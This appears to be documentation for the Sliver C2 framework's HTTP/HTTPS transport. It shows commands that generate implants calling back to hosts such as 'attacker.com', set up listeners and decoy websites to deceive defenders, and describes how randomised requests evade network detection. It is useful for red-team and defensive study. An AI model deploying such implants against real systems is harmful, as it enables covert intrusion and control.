# Setup

Sliver supports proxy-aware C2 over both HTTP and HTTPS, however since Sliver does not rely upon the SSL/TLS layer for security these protocols are considered somewhat synonymous. There are separate commands for the listeners but an implant generated with `--http` may attempt to connect over both HTTP and HTTPS (see "under the hood" for more details.
 

## Generate the Implant

Sliver implants are compiled with a baked-in (but obfuscated of course) server domain that they will reach back out to. To generate a sliver implant that communicates to a server at `example.com` run the following:

#### Basic Example

```
sliver > generate --http example.com --os mac

[*] Generating new darwin/amd64 implant binary
[*] Build completed in 00:00:05
[*] Implant saved to /Users/moloch/Desktop/WORKING_HACIENDA
```

#### Multiple Domains

You can also specify multiple domains, in the event the implant cannot connect to the first it will subsequently attempt to connect to each domain you specified in order. Subsequent attempts are made based on the `--reconnect` argument (default 60 seconds). If no attempts are successful, the implant will loop across all of the domains until `--max-errors` (default 1000) is reached, at which point the implant will terminate execution:

```
sliver > generate --http example.com,attacker.com

[*] Generating new windows/amd64 implant binary
[*] Build completed in 00:00:05
[*] Implant saved to /Users/moloch/Desktop/IMPRESSED_METHANE
```

#### URL Prefixes and Other Options

Some additional options may be passed to the `--http` C2 flag such as URL path prefixes. Sliver's C2 request URLs are randomly generated as described below, however the operator may specify a path to prepend to every request's path, this can be useful when leveraging HTTP re-directors, etc. To add a URL prefix simply add a path to the domain as shown below:

```
sliver > generate --http example.com/foo/bar

[*] Generating new windows/amd64 implant binary
[*] Build completed in 00:00:05
[*] Implant saved to /Users/moloch/Desktop/IMPRESSED_METHANE
```

This implant will now prepend `/foo/bar` to all generated URLs for `example.com`. You may specify different path prefixes for different domains if you so choose.

#### Proxies

The implant attempts to auto-detect proxy settings using a modified version of the [go-get-proxied](https://github.com/rapid7/go-get-proxied) library. It supports detection of system proxy settings on Windows, MacOS, and Linux. In the event the implant cannot make a successful HTTP/HTTPS connection for a given domain using the system proxy settings, it will also attempt to make a connection to the same domain ignoring the proxy settings. The order of connection attempts is as follows:

1. HTTPS over system proxy
1. HTTP over system proxy
1. HTTPS direct connect
1. HTTP direct connect


#### Proxy Configuration

The priority of retrieval is the following:
-  **Windows**
   - Environment Variable: `HTTPS_PROXY`, `HTTP_PROXY`, `FTP_PROXY`, or `ALL_PROXY`. `NO_PROXY` is respected.
   - Internet Options: Automatically detect settings (`WPAD`)
   - Internet Options: Use automatic configuration script (`PAC`)
   - Internet Options: Manual proxy server
   - WINHTTP: (`netsh winhttp`)
- **Linux**
   - Environment Variable: `HTTPS_PROXY`, `HTTP_PROXY`, `FTP_PROXY`, or `ALL_PROXY`. `NO_PROXY` is respected.
- **MacOS**
   - Environment Variable: `HTTPS_PROXY`, `HTTP_PROXY`, `FTP_PROXY`, or `ALL_PROXY`. `NO_PROXY` is respected.
   - Network Settings: `scutil`


## Start the Listener 

To start an HTTP listener use the `http` command, with no parameters this will start a listener on port 80 and respond to any domain (i.e., HTTP `Host:`) that comes in:

```
sliver > http
```

You can optionally restrict the listener to only respond to specific domain using the `--domain` flag, currently each listener can only accept a single domain (but you can start any number of listeners you want):

```
sliver > http --domain example.com
```


## Static Content

Sliver can stand up a website on your HTTP(S) listener in order to make the server look more legitimate. For example, you could put a default IIS index page here and mimic a normal-looking server in case someone comes by snooping. You can manage static content using the `websites` command (see `websites --help`):

```
websites --website fake-blog --web-path / --content ./index.html add
```

Each "website" is identified by a name (`fake-blog` in the example above) and is essentially just key<->value pairs request paths (e.g. `/foo/bar.html`) and response's content. Currently we don't support any regex matching for paths, it has to be an exact match, so keep that in mind if you're linking to content.

__Note:__ C2 related messages are identified, intercepted, and responded to prior to checking for user-provided `website` content, so you can actually map content to any URL used for C2.

To use your website with an HTTP(S) listener, specify it using `--website` when you start the listener:

```
sliver > http --website fake-blog --domain example.com
```

## SSL/TLS Certificates

By default when using the `https` listener Sliver will simply generate a random self-signed certificate. However, other options do exist. The `https` listener also supports automatic TLS certificates via Let's Encrypt, which can be enabled using the `--lets-encrypt` flag.

```
sliver > https --domain example.com --lets-encrypt
```

This uses Let's Encrypt/ACME HTTP validation, so the server will need the ability to start a public listener and you'll need to have the DNS for your `--domain` pointed to the Sliver server. If you're having issues pulling a certificate be sure to [check the logs](https://github.com/BishopFox/sliver/wiki/Troubleshooting).

You can also upload your own SSL/TLS certificate/key pairs:

```
sliver > https --domain example.com --cert ./cert.pem --key ./key.pem --website fake-blog
```

# Under the Hood

This section covers the "under the hood" implementation details of Sliver's HTTP C2, and may be useful for users want to understand, extend, or are simply curious about Sliver's design.

### Design Goals

The primary goals of the existing HTTP C2 design are to:

* __Reliable Connections__ The implants foremost goal is to get a connection out of the network, regardless of the environment's configuration. 
* __Data Security__ I won't cover this here, but [click here](https://github.com/BishopFox/sliver/wiki/Transport-Encryption) for details.
* __Network Layer Evasion__ C2 messages should be hard to detect from the network layer, this is done via "Procedural C2" as detailed below. 

### Procedural HTTP C2

This is basically something I just made up, but the idea is that instead of creating custom C2 profiles that define where to put data in an HTTP request we [procedurally generate](https://en.wikipedia.org/wiki/Procedural_generation) an HTTP request with the data in it. In practice this seems to work pretty well, though the number of variations built into Sliver is somewhat limited right now. If the technique proves to work well in the field we'll likely expand it (and at some point it may be a good idea to base the generation based on some type of seeded RNG so that a given request can be regenerated given a seed).

#### Implant-side

The high level process to generate and send a standard session request is (note: this is all after the key exchange, which I'm skipping for now):

1. Randomly generate the request path using built-in path segments. The path will have one of the following extensions, which indicate the type of request. This is distinct from a _message type_, the message type (i.e., the type of command) is in the encrypted so it cannot be determined without the [session key](https://github.com/BishopFox/sliver/wiki/Transport-Encryption). Everything in the path except for the extension is ignored by the server:

* `.txt` = Request the server's public RSA key
* `.jsp` = Initialize session endpoint
* `.php` = Encrypted session messages
* `.js` = Long poll endpoint

2. Randomly select an encoder from `sliver/encoders`, an encoder defines how the message we're trying to send to the server gets encoded. Note that we're always encoding the ciphertext of a message, these encoders are purely for obfuscation _not security_. The currently supported encoders are:
* __Base64__ Base64 with a custom alphabet so that it's not interoperable with standard Base64
* __Hex__ Standard hexadecimal encoding with ASCII characters
* __Gzip__ Standard gzip
* __English__ Encodes arbitrary data as English ASCII text
* __PNG__ Encodes arbitrary data into valid PNG image files
* __Gzip+English__ A combination of the Gzip and English encoders
* __Base64+Gzip__ A combination of the Base64 and Gzip encoders

Each of these encoders has a unique "Encoder ID," which is currently hardcoded but we'll probably randomly generate these per-server in the future.

3. Generate a `nonce`, the nonce is equal to a random number times the `EncoderModulus` plus the encoder ID; the `EncoderModulus` is currently a hardcoded constant value, but we may generate this per-server in the future. The server does the opposite (nonce modulo `EncoderModulus`) to determine the original Encoder ID. In code this looks like:

```
nonce := (insecureRand.Intn(maxN) * EncoderModulus) + encoderID
encoderId := nonce % EncoderModulus
```

The nonce is included in the request as the query parameter `_`, the idea is that this a standard pattern for "cache busting" and at a glance looks legitimate as the nonces look (are) random. The server also ignores any request that does not contain a valid nonce, just in case any pesky blue teamers come sniffing around the web server. An invalid nonce is define as any value that does not map to an Encoder ID or zero. A "NOP" nonce is also supported, which is an encoder ID of zero (i.e. the modulo of the nonce equals zero).

4. Send the request to the server, this could be any valid transport such as HTTP, HTTPS, or over a proxy -the same request format is always used for any HTTP-like protocol.

#### Server-side

5. When the server receives the request it will route the request to a given handler based on the requested path's extension as detailed above (in this case we're talking about paths that end in `.php`).

6. Check that the request contains a valid nonce, if the request does not contain a valid nonce it is ignored from a C2 standpoint but the server may still respond with `website` content.

7. Determine the encoder based on the nonce, decode and decrypt the request. 

8. Execute any server-side processing.

9. Should the request merit a response, encode the encrypted response using the same encoder as the request. By using the same encoder as the request we ensure the implant supports a given encoder (in case of a version mismatch between implant and server) and allows the implant to limit the encoders used if it so chooses.

10. Send the response back to the implant.


